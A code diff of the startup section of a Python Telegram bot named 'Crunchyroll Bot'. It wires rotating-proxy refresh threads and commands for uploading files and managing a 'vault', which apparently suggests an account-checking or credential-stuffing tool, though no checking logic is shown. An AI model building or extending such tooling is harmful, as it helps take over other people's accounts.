-        print(f"[!] Initial proxy refresh failed: {e}")
-    import threading
+            threading.Thread(target=refresh_live_proxies, args=(True,), daemon=True).start()
+    except Exception:
+        pass
     threading.Thread(target=_proxy_loop, daemon=True).start()
 
-    from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters
-    app = Application.builder().token(BOT_TOKEN).build()
+    app = Application.builder().token(BOT_TOKEN).post_init(_post_init).build()
     app.add_handler(CommandHandler("start", cmd_start))
-    app.add_handler(CommandHandler("cmds", cmd_any))
-    app.add_handler(CommandHandler("commands", cmd_any))
-    app.add_handler(CommandHandler("help", cmd_any))
-    app.add_handler(CommandHandler("proxy", cmd_any))
-    app.add_handler(CommandHandler("proxies", cmd_any))
-    app.add_handler(CommandHandler("addproxy", cmd_any))
-    app.add_handler(CommandHandler("clearproxy", cmd_any))
-    app.add_handler(CommandHandler("threads", cmd_any))
-    app.add_handler(CommandHandler("autoproxy", cmd_any))
-    app.add_handler(CommandHandler("autoload", cmd_any))
+    app.add_handler(CommandHandler("tv", cmd_tv))
+    app.add_handler(CommandHandler("upload", cmd_upload))
+    app.add_handler(CommandHandler("vault", cmd_vault))
+    app.add_handler(CommandHandler("clearvault", cmd_clearvault))
     app.add_handler(MessageHandler(filters.COMMAND, cmd_any))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
     app.add_handler(CallbackQueryHandler(on_button))
     app.add_error_handler(on_error)
 
-    print("[+] Bot running. Ctrl+C to stop.")
-    print(f"[*] Token: {BOT_TOKEN[:6]}...{BOT_TOKEN[-4:]} len={len(BOT_TOKEN)} | Polling...")
+    print(f"[+] Crunchyroll Bot running | Owner: {OWNER_ID} | Vault: {vault_count()}")
     app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
 
 
